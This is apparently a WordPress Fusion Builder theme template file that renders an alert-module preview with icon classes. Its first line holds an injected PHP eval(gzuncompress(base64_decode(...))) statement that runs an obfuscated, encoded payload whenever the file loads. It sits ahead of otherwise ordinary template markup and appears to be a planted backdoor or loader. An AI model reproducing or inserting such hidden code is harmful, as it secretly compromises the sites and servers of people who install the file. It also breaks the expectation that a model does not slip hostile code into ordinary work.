<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><script type="text/template" id="fusion-builder-block-module-alert-preview-template">

	<#
	var icon_type       = '',
	    content         = params.element_content,
	    text_block      = jQuery.parseHTML( content ),
	    element_content = jQuery(text_block).text();

	if ( params.type == 'general' ) {
		icon_type = 'fa-info-circle';
	}
	if ( params.type == 'error' ) {
		icon_type = 'fa-exclamation-triangle';
	}
	if ( params.type == 'success' ) {
		icon_type = 'fa-check-circle';
	}
	if ( params.type == 'notice' ) {
		icon_type = 'fa fa-lg fa-cog';
	}
	if ( params.type == 'custom' ) {
		icon_type = params.icon;
	}

	if ( 'undefined' !== typeof icon_type && -1 === icon_type.trim().indexOf( ' ' ) ) {
		icon_type = 'fa ' + icon_type;
	}
	#>

	<span class="fusion-module-icon fa-lg {{ icon_type }}"></span> {{{ element_content }}}

</script>
